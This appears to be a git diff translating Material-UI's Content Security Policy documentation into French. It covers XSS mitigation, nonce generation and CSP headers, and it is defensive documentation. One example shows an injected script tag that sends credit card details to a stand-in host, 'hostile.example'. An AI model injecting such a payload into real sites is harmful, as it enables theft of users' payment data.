@@ -278,22 +278,22 @@ const Button = withStyles(styles, { name: 'button' })(ButtonBase);
 
 ### Qu'est-ce que le CSP et en quoi est-ce utile ?
 
-Fondamentalement, CSP atténue les attaques XSS (Cross-Site Scripting) en obligeant les développeurs à ajouter aux listes blanches les sources de leurs ressources. Cette liste est renvoyée en tant qu'en-tête du serveur. Par exemple, disons que vous avez un site hébergé à ` https://example.com ` l'en-tête CSP ` default-src: 'self'; ` autorisera toutes les requêtes à destination de ` https://example.com/* ` et refusera tous les autres. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:
+Fondamentalement, CSP atténue les attaques XSS (Cross-Site Scripting) en obligeant les développeurs à ajouter aux listes blanches les sources de leurs ressources. Cette liste est renvoyée en tant qu'en-tête du serveur. Par exemple, disons que vous avez un site hébergé à ` https://example.com ` l'en-tête CSP ` default-src: 'self'; ` autorisera toutes les requêtes à destination de ` https://example.com/* ` et refusera tous les autres. Si une section de votre site Web est vulnérable au XSS dans laquelle une entrée d'utilisateur non échappée est affichée, un attaquant pourrait saisir quelque chose du genre :
 
     <script>
       sendCreditCardDetails('https://hostile.example');
     </script>
     
 
-This vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.
+Cette vulnérabilité permettrait à l'attaquant d'exécuter n'importe quoi. Cependant, avec un en-tête CSP sécurisé, le navigateur ne chargera pas ce script.
 
 You can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).
 
-### How does one implement CSP?
+### Comment met-on en place un CSP?
 
-In order to use CSP with Material-UI (and JSS), you need to use a nonce. A nonce is a randomly generated string that is only used once, therefore you need to add a server middleware to generate one on each request. JSS has a [great tutorial](https://github.com/cssinjs/jss/blob/next/docs/csp.md) on how to achieve this with Express and React Helmet. For a basic rundown, continue reading.
+Pour utiliser CSP avec Material-UI (et JSS), vous devez utiliser un "nonce". Un "nonce" est une chaîne générée aléatoirement, utilisée une seule fois. Vous devez donc ajouter un proxy (middleware serveur) pour en générer un à chaque requête. JSS has a [great tutorial](https://github.com/cssinjs/jss/blob/next/docs/csp.md) on how to achieve this with Express and React Helmet. Pour un aperçu de base, continuez à lire.
 
-A CSP nonce is a Base 64 encoded string. You can generate one like this:
+Un nonce CSP est une chaîne codée en Base 64. Vous pouvez en générer un comme ceci:
 
 ```js
 import uuidv4 from 'uuid/v4';
@@ -301,7 +301,7 @@ import uuidv4 from 'uuid/v4';
 const nonce = new Buffer(uuidv4()).toString('base64');
 ```
 
-It is very important you use UUID version 4, as it generates an **unpredictable** string. You then apply this nonce to the CSP header. A CSP header might look like this with the nonce applied:
+Il est très important d’utiliser UUID version 4, car cela génère un token ** imprévisible. **. Vous appliquez ensuite ce nonce à l'en-tête CSP. Un en-tête CSP pourrait ressembler à ceci avec le nonce appliqué:
 
 ```js
 header('Content-Security-Policy')
